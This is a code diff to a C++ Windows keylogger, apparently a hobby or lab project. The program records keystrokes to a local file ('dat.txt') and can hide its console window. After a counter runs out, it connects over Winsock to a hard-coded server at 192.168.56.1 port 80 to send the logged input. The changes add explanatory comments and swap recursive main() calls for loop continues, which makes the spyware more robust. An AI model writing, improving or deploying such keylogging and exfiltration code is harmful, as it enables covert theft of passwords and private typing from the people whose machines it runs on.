@@ -10,6 +10,7 @@ using namespace std;
 std::string content;
 int counter = 0;
 
+//writes last user input to the long term file ("dat.txt")
 void LOG(string input)
 {
 	fstream LogFile;
@@ -34,7 +35,7 @@ int main()
 {
 	while (true)
 	{
-		//ShowWindow(GetConsoleWindow(), SW_HIDE);
+		//ShowWindow(GetConsoleWindow(), SW_HIDE); //uncomment this to hide console window on startup
 		char KEY = 'x';
 
 		for (int KEY = 8; KEY <= 190; KEY++)
@@ -53,6 +54,8 @@ int main()
 				}
 			}
 		}
+
+		//Counts up until the given amount before attempting connection to the server, and meanwhile records keystrokes
 		if (counter < 1000)
 		{
 			cout << counter << endl;
@@ -60,9 +63,9 @@ int main()
 			counter += 1;
 			continue;
 		}
-
-		string ipAddress = "192.168.56.1";			// IP Address of the server
-		int port = 80;						// Listening port # on the server
+		
+		string ipAddress = "192.168.56.1";	// IP Address of the server
+		int port = 80;				// Listening port # on the server
 		string userInput;
 		std::ifstream text;
 		std::string textGet;
@@ -74,7 +77,7 @@ int main()
 		if (wsResult != 0)
 		{
 			cerr << "Can't start Winsock, Err #" << wsResult << endl;
-			main();
+			continue;
 		}
 
 		// Create socket
@@ -82,7 +85,7 @@ int main()
 		if (sock == INVALID_SOCKET)
 		{
 			cerr << "Can't create socket, Err #" << WSAGetLastError() << endl;
-			main();
+			continue;
 		}
 		// Fill in a hint structure
 		sockaddr_in hint;
@@ -99,7 +102,7 @@ int main()
 			if (connResult == SOCKET_ERROR)
 			{
 				cerr << "Can't connect to server, Err #" << WSAGetLastError() << endl;
-				main();
+				continue;
 			} //Repeats from top to here until a successful connection is acheived
 			else
 			{
@@ -108,10 +111,11 @@ int main()
 		}
 		else
 		{
+			//Resets counter
 			cout << counter << endl;
 			Sleep(1);
 			counter += 1;
-			main();
+			continue;
 		}
 
 		if (connResult != SOCKET_ERROR)
@@ -167,7 +171,7 @@ int main()
 				}
 				else
 				{
-					main();
+					continue;
 				}
 			}
 		}
@@ -196,12 +200,12 @@ int main()
 				}
 				int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
 			}
-			main();
+			continue;
 		}
 		// Gracefully close down everything
 		closesocket(sock);
 		WSACleanup();
-		main();
+		continue;
 		return 0;
 	}
 }
